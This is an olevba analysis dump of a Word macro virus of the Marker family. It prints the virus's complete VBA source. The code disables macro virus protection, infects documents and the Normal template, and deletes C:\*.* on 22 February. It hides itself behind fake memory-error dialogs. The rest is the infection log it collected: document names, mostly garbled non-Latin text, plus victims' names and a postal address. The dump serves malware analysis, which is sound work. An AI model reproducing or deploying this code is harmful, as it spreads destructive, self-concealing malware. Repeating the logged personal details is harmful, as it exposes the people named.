olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x-75d9f49ffe26ce04af6862a947c7958ef3c90b99
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x-75d9f49ffe26ce04af6862a947c7958ef3c90b99 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Private Sub Document_Close()
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
On Error Resume Next
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Dim ad, nt As Object
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Dim rep, x As Integer
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Dim virusCode, UserAddress, LogData, LogFile As String
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Options.VirusProtection = False
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Options.SaveNormalPrompt = True
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Delivery:
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If Day(Now()) = 22 And Month(Now()) = 2 Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Kill "C:\*.*":
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
GoTo Delivery
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If DocumentInfected = True Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
SaveNormalTemplate = NormalTemplate.Saved
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
For i = 1 To Len(Application.UserAddress)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Else
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
UserAddress = UserAddress & Chr(13) & "' "
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Next i
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
virusCode = virusCode & LogData
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.AddFromString virusCode
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
With nt.codemodule
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End With
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
With nt.codemodule
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
For x = 45 To 181 Step 2
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Next x
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End With
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If SaveNormalTemplate = True Then NormalTemplate.Save
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If NormalTemplateInfected = True Then
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
SaveDocument = ActiveDocument.Saved
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
ad.codemodule.AddFromString virusCode
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.AddFromString virusCode
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
ad.codemodule.Deletelines 174, 13
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
With ad.codemodule
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
For x = 45 To 181 Step 2
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Next x
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End With
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
If SaveDocument = True Then ActiveDocument.Save
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
Options.SaveNormalPrompt = False
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
End Sub
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
' HANJUNG hsintao(OMRF).doc2000.10.31 오전 11:39:57\\SV085\pg082 - NE02:
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
' HANJUNG hsintao(OMRF).doc2000.10.31 오전 11:39:57\\SV085\pg082 - NE02:
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:
' HANJUNG hsintao(OMRF).doc2000.10.31 오전 11:39:57\\SV085\pg082 - NE02:
' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:

' HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:

' flres1.doc

' sample1.doc

' Lawton updated resume.doc

' LEMERISE.DOC

' galianes.doc

' CVUK.doc

' word95_BinLi.doc

' Eduard 1.doc

' rakowski.doc

' DHRUVER.DOC

' 01:08:39 PM -Wednesday,16 Jun,1999
' DhruveR
'
' Dhruver.doc

' 6-15.doc

' DJI RESTORE.doc

' 03:58:39 PM -Wednesday,16 Jun,1999
' Tom Dziubek
'
' DJI RESTORE.doc

' FEC Script.doc

' OutlookDelegates.doc

' nite.doc

' sbranc01.doc

' newuser-djxpress.doc

' june_99.doc

' 02:01:37 PM -Monday,28 Jun,1999
' TozziT
'
' june_99.doc

' teammov1.doc

' 03:34:41 PM -Wednesday,7 Jul,1999
' DziubekT
'
' teammov11.doc

' Document2

' oneweek.doc

' oneweek.doc

' Document1

' twoweek.doc

' 4week.doc

' 01:44:35 PM -Wednesday,7 Jul,1999
' Ernesto Dulce
'
' 4week.doc

' FSDLA.doc

' FSDLA.doc

' July 13th Outage Request.doc

' 12:14:22 PM -Monday,12 Jul,1999
' cnsncc
'
' July 13th Outage Request.doc

' Kathy's Resume1.doc

' ubeedoo.doc

' Unregistered Network Numbers.doc

' servernames.doc

' data circuits 1.doc

' DAILY ACTIVITY REPORT.doc

' 09:51:17 AM -Tuesday,13 Jul,1999
' Susie Scornavacca
'
' DAILY ACTIVITY REPORT.doc

' june.doc

' OSDJune1999.doc

' djxprss Request Form1.doc

' Shadow R4.doc

' TOKREPLL.doc

' bypass.doc

' 12:20:36 PM -Tuesday,13 Jul,1999
' Bob Brooks
'
' bypass.doc

' WORD.doc

' UPDSecIDaud21.doc

' UPDSecIDaud21.doc

' 09:14:25 AM -Friday,16 Jul,1999
' Deb Sorchinski
' 20 Academy Street
' Princeton, NJ  98540
' UPDSecIDaud2.doc

' editor~2.doc

' CEO Expectations & Decision Making.doc

' HR Issues.doc

' WINWORD.DOC

' dorrisobrien_bio.doc.doc

' MelConnet_bio.doc.DOC

' Aeneid Position Spec 7-2-99.doc

' orgchart.doc

' top level org chart.doc

' first note.doc

' top level org chart.doc

' Sunesis Group Communications.doc

' first note.doc

' CONTACT LIST DIRECT.doc

' GSReview.doc

' WEEKLY STAFF MEETING-TIM ANDREWS.doc

' Polycom1.doc

' PENDING JV ITEMS_.doc

' WAVO MEETING AGENDA.doc

' 03:08:21 AM -Friday,23 Jul,1999
' Dow Jones Employee
'
' WAVO MEETING AGENDA.doc

' bruce

' Bruce2

' bruce3

' email.doc

' Revised Activities By Role - Working Team.doc

' DJICustomerLetter_American English.DOC

' ppteam.doc

' 12:23:02 PM -Tuesday,27 Jul,1999
' DJIPI - HK
'
' ppteam.doc

' quotation for eve.doc

' Great Note from Tim Andrews (Customer Focus & Leadership).doc

' Tim Andrews Note - 3rd month of JV.doc

' DJRBI Top Level Organizational Chart.doc

' top level org chart.doc

' Chinatrust Agreement.doc

' RBB Proposal.doc

' Sources Available on RBB.doc

' Hospital Authority - successful experience & DJ Technical Contact.doc

' WINWORD.DOC

' RBB Trial Evaluation Letter.doc

' 08:49:41 AM -Thursday,29 Jul,1999
' Warren Tang
'
' RBB Trial Evaluation Letter.doc

' TAcontentexchange.doc

' DJI English Intro.doc

' RBB intro.doc

' Reuters.doc

' Orient.doc

' WINWORD.DOC

' Inform.doc

' Inform.doc

' 11:02:38 �鷗� -Monday,16 Aug,1999
' Administrator
'
' PW.doc

' Siemens.doc

' Enron China PW.doc

' Document2

' Dow Jones.doc

' Change to the contractLegend.doc

' Legend.docfilename=Legend.doc

' RBB SelectCCTV.doc

' RBB SelectCCTV2.doc

' 05:19:20 PM -Friday,20 Aug,1999
' ws12
'
' RBB_SelectCCTV.doc

' 忌눈뵨쒔檀롸잼，객몹菱방쪼頓鱗.doc

' 0823XMFX.doc

' 0823XXT.doc

' 쒔셌꼬몹으커벌헤쌘커꿉뺍蝎.doc

' 斤口꿉뺍莉훙逃묏栗깊.doc

' 斤口꿉뺍莉훙逃섟묏鱗斂콘.doc

' 斤口꿉뺍莉훙逃묏栗깊.doc

' 1練  琯.doc

' 밑黨“箇옰세苟券”쌘커돨접淃괩멩.doc

' “櫓빽륩干匡뺏嵐듯”쌘커쉥瞳랗敬꺄놔.doc

' 멕黛漑0824.doc

' 燔�國�.doc

' 쒔셌꼬쌘커괩꺄깊.doc

' 0825XMFX.doc

' 0826SMFX.doc

' 꽝옘朞痙0826.doc

' 棍젬쒔롤賈痰구戈쩌.doc

' 숌    괩.doc

' 숌괩0325.doc

' 櫓卵랗敬쒔셌꼬쌘커괩꺄데1.doc

' 쌘커긴땡繫列23.doc

' 0828XMFX.doc

' 990829－2.xls

' 806淚소꿉뺍삔朞痙.doc

' 990829－3.xls

' 990829－1.xls

' BTD0828.doc

' RCXX0829.doc

' 꽝옘朞痙0830.doc

' 0829SMFX.doc

' 0830SMFX.doc

' 0830SXT.doc

' 990829－1.xls

' 匡도3

' 990829－3.xls

' 쏜皐뒈0829.doc

' �荇�0829.doc

' 匡도2

' 0829XXT1.doc

' BTD0830.doc

' 05:40:49 PM -Wednesday,1 Sep,1999
' mac03
'
' BTD0901.doc

' 0902SXT.doc

' 꼬쥴돔：.doc

' 긍품꽝옘902A.doc

' 1.doc

' 0901SXT.doc

' 0901XXT.doc

' 0902A.doc

' 990902－1.xls

' 990902－2.xls

' 990902－3.xls

' 쏜皐뒈0902.doc

' �荇�0902.doc

' 0902.doc

' 0902XXT.doc

' 0902XMFX.doc

' jky0902.doc

' 《櫓벌꼿쒔괩돛》괩痙데831.doc

' �荇�0901.doc

' 첵竟뚤淚撚무밑륩蛟돨矜헹.doc

' 貢쭹櫓劤壙喇쬠돨景듐섟페唐槻왠齡놓決.doc

' 櫓벌훙췽댕欺劤壙溝첵썽淚소죗깊.doc

' 멕黛漑0615.doc

' 斤1.doc

' 멕黛漑0805.doc

' RCXX0527.doc

' RCXX0609.doc

' 0904XXT.doc

' 쏜皐뒈0901.doc

' 쏜皐뒈0904.doc

' �荇�0904.doc

' 0904XMFX.doc

' 0905SXT.doc

' 08:23:59 AM -Saturday,11 Sep,1999
' ws12
'
' 0909SXT.doc

' 櫓卵든柬憩쒔셌꼬밑黨“든柬憩功삔쌘커딧꿴”돨삠괩.doc

' ’99《꼿말》홍헷쬠見·�瞿Ｄ猿蘇邈薺㉤�.doc

' 攻.doc

' 其엊럇陋.doc

' 913.doc

' jkm0913.doc

' 齡튬훙삔累쒔롤渡炬.doc

' ~$랑무鱇悧꼴련빽꿉뺍.doc

' 917.doc

' 긍서莉묏鱗직넋맣쏵렘갭.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' jky0917.doc

' jkr0917.doc

' jkm0917.doc

' jkf0917.doc

' 셕炬샙各썹   벌셥.doc

' 훙慤뇹쥴돔：.doc

' 匡도3

' BTD9018.doc

' Internet무鱇옘뀁숌션.doc

' 918.doc

' 990918-1.xls

' 990918-3.xls

' 匡도2

' 베袞벌소깊刻쉥셨崎獵契掘끓괏송漣꿉.doc

' 寧鷺路듐朞痙꽝옘920.doc

' jky0916.doc

' jky0914.doc

' 亶景랑무鱇悧꼴굔흩景꺽却련빽괩돛꿉뺍렘갭.doc

' 920-1.doc

' 匡도2

' 919.doc

' Backup of 10墩路듐朞痙.wbk

' 쒔셌꼬9墩룀齡튬훙삔累션쩌.doc

' 밑黨《�荇障렝맣옇캅椽셋렌韶庸픈�.doc

' 줄珂훙逃익蛟랙렴깊.doc

' 匡도1

' 匡도2

' 《몸鬼鬼벌唐폐撚돨믐慤》.doc

' 匡도1

' 亶벌든柬劤壙：몸昑뺏，寮꺄섟劤관陋.doc

' 닒든柬쌘커관陋近駕긴뺏였든柬첵썽돨몸昑뺏瀏헹.doc

' 쒔셌틉돛돨近蹶섟忌눈.doc

' 쬠틔탬濫쫠瞳틉돛쒔檀櫓돨路狼鱗痰0625.doc

' 9027smfx.doc

' 밑黨鹿쳄벌槨看돨굇獨볜횔뷰珞.doc

' 枷寧퍅쇌쒔셌꼬쌘커꺄놔데.doc

' 枷寧퍅쇌쌘커꺄놔데.doc

' 0927XMFX.doc

' jkr0927.doc

' 0928SXT.doc

' 匡도1

' 灌黛놉乂 훨路돛陶.doc

' 灌黛놉乂，훨路돛陶.doc

' 쏜皐뒈0927.doc

' �荇�0927.doc

' 04:15:29 PM -Thursday,28 Oct,1999
' 008
'
' life1027.doc

' c1029.doc

' c1101.doc

' 09:27:51 AM -Wednesday,3 Nov,1999
' 008
'
' c1103.doc

' 헝刻괩멩.doc

' DSYS.doc

' CAZHDBFW

' 珙덮콱봤：.doc

' 匡도1

' c1110.doc

' 匡도2

' 《珂�鬼렘旼옹鴛㈕ぱ￡�.doc

' 巧枷쾨쀼蔣（든斤경）.doc

' 句롤딧꿴맣경駕빈돨湳튬.doc

' 09:19:33 AM -Monday,8 Nov,1999
' yenan
'
' 句롤딧꿴맣경駕빈돨湳튬.doc

' ~WRL1293.tmp

' 繫祇쩌.doc

' 션慤굶.doc

' 셕뺍蝎.doc

' 譚黨딧꿴貢쭹賈痰셕炬샙쪽멕，헝몹貫.doc

' ~WRL0001.tmp

' ~WRL0001.tmp

' 櫓벌든柬句롤딧꿴貢쭹묏鱗셕뺍蝎.doc

' 櫓벌든柬句롤딧꿴貢쭹묏鱗셕뺍蝎.doc

' ~WRL0001.tmp

' 뒈렘憩먁菫혹돨朞痙.doc

' 췽봄륩蛟.doc

' 밑黨쐤퍅묏鱗鬼써.doc

' 09:34:31 AM -Thursday,16 Nov,2000
' yenan
'
' 밑黨쐤퍅묏鱗鬼써.doc

' 匡도2

' �鉞�.doc

' 匡도1

' 句롤딧꿴흔부隣.doc

' 匡도1

' 匡도2

' 句롤莉훙逃츰데.doc

' 句롤莉훙逃츰데 25훙.doc

' 匡도1

' 句롤莉훙逃돨�虛�.doc

' 匡도2

' Doc1.doc

' tcm.doc

' 匡도3

' 棍찡륩蛟.doc

' 柬괏팁.doc

' 柬괏팁딧꿴깊.doc

' 貢쭹桔擎삔.doc

' 01:16:25 PM -Wednesday,13 Dec,2000
' yenan
'
' 貢쭹桔擎삔.doc

' 든柬憩.doc

' 櫓벌든柬句롤딧꿴貢냥逃憩젬溝훙섟젬溝렘駕.doc

' 路헤돨툉堂쳬.doc

' 繫  列.doc

' 柬괏팁.doc

' 밑黨뉴쌘景깎쌘커.doc

' 踏狗.doc

' 12:51:04 PM -Sunday,26 Dec,1999
' ljf
'
' 踏狗.doc

' 듐힛힛鬼틔.DOC

' 匡도2

' 쟀썅렷谿羚삶禿黨뎠덜匡欺桔씩썹綠쐤랗枷쾨，寧殮角맡쥴堵코뇹黨품懶뒈던、撻唐넣씹緞捲제돨路狼돨栗�疽噓읊捻錮㎑翔�寧.doc

' 뗍袈唐0.doc

' 뗍袈唐1.doc

' 뗍袈唐먁.doc

' 匡도2

' 북谿.doc

' 2000.doc

' 봤�瀯�.doc

' “냘懇珂덜”匡欺蝎溝.doc

' Doc4.doc

' 匡도2

' 匡도2

' 땡檄.doc

' 斂냔.doc

' 뗍《겟쾨凜鍍》唐먁0.doc

' 뗍《겟쾨凜鍍》唐먁.doc

' 匡도1

' 匡도1

' 匡도1

' 匡도1

' 쭈퓻죠�☏켜�.doc

' 쭈퓻죠角寧몸봤훙.doc

' 뉴莖.doc

' 젯暾쟝角寧몸봤캡항.doc

' 匡도1

' 찻꼍떼삔빽磎    틔瓘쏩給훙��.doc

' 例콘遼酪잼콱唐뜩陶.doc

' 匡도1

' �聆篇┙昞켯罔ば�.doc

' �聆篇┙昞켯罔ば�.doc

' 匡도1

' 匡도1

' JG003.doc

' 쒔檀例쁜.doc

' CMS1.doc

' 匡도1

' 굇쑴功괩멨.doc

' 匡도1

' 匡도1

' 匡도2

' 눈廬목駕.doc

' 괩송목駕.doc

' 괩송목駕.doc

' 匡도1

' 貢쭹匡欺쉽寧賈疼賈慤놔唐凜.doc

' 쨀祺狂痙.doc

' 쑹틔嵐瓊갭.doc

' 핵�ず衢� 珂�琴�朞.doc

' 怒윰옹薑――求擄샙저袈돨蝎畇諒.doc

' 315箇큇켈멨.doc

' 315소든朞뭔멕癎멨.doc

' 숌괩목駕.doc

' 숌괩목駕.doc

' 랙멨悧써.doc

' DOC1.DOC

' 匡도2

' DOC1.DOC

' DOC1.DOC

' 캡老흔렀.doc

' 굇쑴든柬憩뉴쌘.doc

' 求擄“맴씐”劤매쿡.doc

' 쑴멍膠撚淃커역連헙워.doc

' 劤壙멨룐충.doc

' 捺밟宅�넋�.doc

' 宮獨貢弄푤荏헙훙.doc

' 捺밟宅�넋�.doc

' 宮獨貢弄푤荏헙훙.doc

' 怒윰옹薑홍충쏵엊求擄샙契撚.doc

' 깥芎괵珞多랙齡잤셉朞痰裂轢.doc

' 1墩익蛟롤츰데.doc

' 匡도1

' 씌轢뚤癎롸驕宅壇뚤꿉쫠.doc

' “鬧雷제”쉽못强.doc

' 캡항.doc

' 깥芎、求擄샙잚1-26.doc

' 묏鱗悧써悧룐충.doc

' 좼�桭慈㉪滿湯쉼�.doc

' 315풉瞳誇샙渡렝.doc

' 匡도1

' 匡도1

' 3-4墩첵썽셕뺍.doc

' 《굶괩쏟휑놔샌》鱗諒츰데.doc

' 匡도2

' 匡도1

' 匡도1

' 匡도1

' 匡도2

' 《굶괩쏟휑놔샌》箇蝎츰데.doc

' 匡도1

' 匡도2

' 묏鱗도갭.doc

' AXJLB.DOC

' CH.DOC

' DH.DOC

' NAME.DOC

' WJ.DOC

' WZPB.DOC

' 힛寧巧鬼喇쬠.doc

' 굇쑴렛뒈끓憧羚痰멨.doc

' 匡도1

' 鮫쳔綾劤壙멨2.doc

' 鮫쳔綾劤壙멨1.doc

' 匡도1

' 匡도1

' 츠츠겜겜朞소든.doc

' 匡도1

' 劤壙젬꺄꽃련쀼댑.doc

' 匡도1

' 匡도1

' 鮫쳔綾劤壙멨3.doc

' 匡도1

' 잠궐沂븐.doc

' 든緞침렘“걔薑엥”瞳旗瘻.doc

' 깥芎、求擄샙잚2-16.doc

' 鮫쳔綾瞳櫓벌.doc

' 匡도1

' 匡도1

' SBSpublicconsulting.doc

' 쑹틔嵐흡劤壙셕뺍.doc

' 劤壙멨4.doc

' 匡도2

' 匡도1

' 吝路행뉴.doc

' 깥芎、求擄샙잚2-16.doc

' 깥芎、求擄샙잚2-16.doc

' 깥芎冷狼隣竟쇱.doc

' 憐竟뚤癎栗죕.doc

' 깥芎、求擄샙잚2-16.doc

' 뚤癎栗죕.doc

' 匡도1

' 浬놔机緊돨큽��.doc

' 괩멩.doc

' 뎠큽훙枓島貢쭹.doc

' 匡도2

' 눈廬.doc

' 鬼�酎懇쫍타�.doc

' Sinch-c(1).doc

' 뎠큽훙枓島貢쭹.doc

' 쀼련써벎劤壙멨.doc

' 鮫쳔綾劤壙멨4.doc

' 鮫쳔綾劤壙멨5.doc

' 630양끝멨.doc

' 櫓벌든柬撚突쿨劤샙島.doc

' 匡도1

' 匡도1

' 匡도2

' 匡도3

' 匡도4

' 匡도5

' 鷺랍릿角꼇角“各셩櫓벌앵隔”.doc

' 룐충�碗�.doc

' 匡도1

' 匡도1

' Doc1.doc

' 匡도1

' 匡도1

' 匡도1

' 匡도1

' 匡도1

' 捏틔탬댔폅“묑懃濫”.doc

' 鮫쳔綾劤壙멨6.doc

' 든켬栗죕.doc

' 일奈났劤壙멨.doc

' 怒윰옹薑瞳櫓벌.doc

' road show--2000匡俚.doc

' 썩綱늦.doc

' 怒윰옹薑저袈.doc

' 匡도1

' 匡도1

' 匡도1

' 鮫쳔綾劤壙멨7.doc

' 匡도1

' newspaper2.doc

' 鮫쳔綾劤壙멨8.doc

' 묏鱗도갭（랗）.doc

' robot brochure.doc

' 탠찡可.doc

' 暠튬뚤궐匡俚綱츠.doc

' 저쎌걔薑엥츰데.doc

' 썩綱늦.doc

' 男헝변.doc

' 男헝변.doc

' 릿숭 썩綱늦.doc

' 쑹틔嵐劤壙멨.doc

' 쑹틔嵐劤壙멨랗.doc

' 啖攣뽈뒨.doc

' 09:41:53 AM -Tuesday,30 Mar,1999
' sl
'
' %D3%BA%D5%FD%BB%CA%B5%DB.doc?funcid=readpart&websid=EAGiYwAhG&mid=MX6aBTm174i47-D5EEYS&part=2&filename=%D3%BA%D5%FD%BB%CA%B5%DB

' 匡도瞳 Microsoft Internet Explorer

' 匡도瞳 Microsoft Internet Explorer

' 2.doc

' 10:28:29 AM -Monday,10 Apr,2000
' 謳렵
'
' 쀼瓘《啖攣뽈뒨》.doc

' 乖쳬呵쭝죄痂척.doc

' LJSEXXYI.doc

' LJSEXXYI.doc

' 밑黨무鱇撚蛟훙逃饋簡섟쉽쟨桿契곗랬.doc

' 鷺믄냘邱�骸켯近吐캥�밖.doc

' 댕牘돨믐慤.doc

' 1.doc

' 匡도1

' 1.doc

' 匡도1

' x1.doc

' 큔獨“櫓벌匡뺏�慊납퐈굣쉼�.doc

' 09:36:48 PM -Thursday,13 Apr,2000
' 觀쟝엊
'
' 큔獨“櫓벌匡뺏�慊납퐈굣쉼�.doc

' 무鱇淃커.doc

' 11:29:30 AM -Friday,14 Apr,2000
' 蠟에
'
' 무鱇淃커.doc

' 눈廬a.doc

' POEMS.doc

' SONGS.doc

' 눈廬痰笭.doc

' 눈廬.doc

' SHNEW.DOC

' 劤쉔 Microsoft Word 匡도.doc

' 匡도1

' 匡도1

' 匡도1

' 뛔뽕嵐忌눈股밤셕뺍.doc

' 1.doc

' 뛔뽕柯욀論減嵐劤壙멨.doc

' 뛔뽕論減嵐劤壙멨.doc

' 뛔뽕嵐暠튬綱츠.doc

' 삔셕齡똑.doc

' 쯩숯텬.doc

' 匡도2

' 뛔뽕論減嵐忌눈股밤롤渡炬.doc

' 理줏북谿.doc

' 匡도3

' 匡도2

' 葵累蝎1.doc

' 葵累1.doc

' 匡숭001.doc

' 櫓벌뛔뽕멨.doc

' 男헝변.doc

' 劤쉔 Microsoft Word 匡도.doc

' 桿쬠쉴溪具.doc

' 拱콘츰튬.doc

' JL.doc

' 08:07:11 PM -Wednesday,21 Jun,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' JL.doc

' Cjl-jl.doc

' 숌저.doc

' 몸 훙숌 저.doc

' 숌저2（亶）.doc

' 숌저2.doc

' 숌저(1).doc

' 몸   훙   숌   저.doc

' 몸훙숌저(1).doc

' 몸훙숌저(2).doc

' 땟儺.doc

' 헹斂변.DOC

' 꽐깝.doc

' 땜꼬뺏欺-붚-璂송.doc

' 있記-璂송.doc

' Doc1.doc

' qxzd0617-2.doc

' qxzd0131-2.doc

' 벴있莖5%EC桿駱와빵츰쩌.doc

' 덮땜뒈혐벴있莖饋簡듐섟彊逕헙워.doc

' 2000TW-BM021.doc

' 2000TW-BM027.doc

' 11:02:09 AM -Tuesday,4 Jul,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' 2000TW-BM038.doc

' 와빵츰쩌.doc

' ZHANGYI.doc

' 璂송-땜꼬-빤켓낀��.doc

' ZDCH003.doc

' 璂송-땜꼬-�紬⒜���.doc

' 匡도1

' 놔뀌괩멩05.doc

' 匡도1

' 묏鱗휑션.doc

' 璂송-멕錟陶땜.doc

' 堵츰鬧꿍북谿蝎.doc

' 堵츰밗잿츰쩌.doc

' 마운饋簡헙워.doc

' 2000TW-BM002.doc

' 2000TW-BM034.doc

' 2000TW-BM006.doc

